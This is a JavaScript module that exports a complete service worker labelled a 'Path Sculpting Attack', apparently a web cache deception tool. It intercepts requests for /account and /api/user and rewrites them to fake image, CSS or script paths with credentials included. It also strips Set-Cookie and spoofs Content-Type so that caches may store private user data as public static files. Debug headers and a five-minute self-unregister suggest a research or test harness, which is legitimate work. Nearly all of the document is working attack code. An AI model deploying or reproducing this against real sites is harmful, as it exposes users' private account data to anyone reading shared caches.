// T1: Path Sculpting Attack - Complete implementation
const T1_PATH_SCULPTING = `
// Service Worker: T1 Path Sculpting Attack
// Targets: /account, /api/user
// Technique: URL rewriting + Content-Type spoofing

const ATTACK_CONFIG = {
  targetPaths: ['/account', '/api/user'],
  deceptiveExtensions: ['.jpg', '.png', '.css', '.js'],
  contentTypes: {
    '.jpg': 'image/jpeg',
    '.png': 'image/png', 
    '.css': 'text/css',
    '.js': 'application/javascript'
  }
};

console.log('[SW-WCD-T1] Path Sculpting activated');

self.addEventListener('install', (event) => {
  console.log('[SW-WCD-T1] Installing');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('[SW-WCD-T1] Activating and claiming clients');
  event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  const pathname = url.pathname;
  
  // Check if this is a target path
  const isTarget = ATTACK_CONFIG.targetPaths.some(target => 
    pathname === target || pathname.startsWith(target + '/')
  );
  
  if (isTarget && !ATTACK_CONFIG.deceptiveExtensions.some(ext => pathname.endsWith(ext))) {
    console.log('[SW-WCD-T1] Intercepting target:', pathname);
    
    // Select random deceptive extension
    const ext = ATTACK_CONFIG.deceptiveExtensions[
      Math.floor(Math.random() * ATTACK_CONFIG.deceptiveExtensions.length)
    ];
    
    const deceptivePath = pathname + '/sw-wcd-cache' + ext;
    const deceptiveURL = url.origin + deceptivePath + url.search;
    
    console.log('[SW-WCD-T1] Rewriting to:', deceptivePath);
    
    const modifiedRequest = new Request(deceptiveURL, {
      method: event.request.method,
      headers: event.request.headers,
      credentials: 'include',
      mode: 'cors',
      redirect: 'follow'
    });
    
    event.respondWith(
      fetch(modifiedRequest)
        .then(response => {
          if (!response.ok) {
            throw new Error(\`HTTP \${response.status}\`);
          }
          
          return response.text().then(body => {
            // Create modified response with spoofed headers
            const modifiedHeaders = new Headers(response.headers);
            
            // Critical: Remove cookies, set spoofed Content-Type
            modifiedHeaders.delete('Set-Cookie');
            modifiedHeaders.set('Content-Type', ATTACK_CONFIG.contentTypes[ext]);
            modifiedHeaders.set('X-SW-WCD-Attack', 'T1-Path-Sculpting');
            modifiedHeaders.set('X-SW-WCD-Original-Path', pathname);
            modifiedHeaders.set('X-SW-WCD-Modified-Path', deceptivePath);
            
            console.log('[SW-WCD-T1] Response modified with spoofed Content-Type');
            
            return new Response(body, {
              status: response.status,
              statusText: response.statusText,
              headers: modifiedHeaders
            });
          });
        })
        .catch(error => {
          console.error('[SW-WCD-T1] Attack failed:', error);
          // Fallback to original request
          return fetch(event.request);
        })
    );
  }
});

// Safety: Auto-unregister after 5 minutes
setTimeout(() => {
  self.registration.unregister().then(success => {
    console.log('[SW-WCD-T1] Safety auto-unregister:', success);
  });
}, 300000);
;

export { T1_PATH_SCULPTING } ;